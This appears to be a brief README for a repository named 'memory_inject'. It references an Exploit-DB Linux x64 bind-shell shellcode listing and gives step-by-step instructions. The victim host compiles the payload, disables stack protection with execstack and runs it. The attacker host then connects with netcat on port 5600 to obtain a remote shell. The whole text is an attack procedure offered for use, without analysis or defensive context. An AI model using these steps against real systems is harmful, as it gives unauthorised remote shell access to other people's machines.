# memory_inject

Linux/x64 - Bind (5600/TCP) Shell Shellcode (87 bytes) 
https://www.exploit-db.com/exploits/41128

TCP bind shell

victim host
1) $ gcc -o bind_shell bind_shell.c
2) $ execstack -s bind_shell
3) $ ./bind_shell

attacker host
1) $ nc victim_host 5600
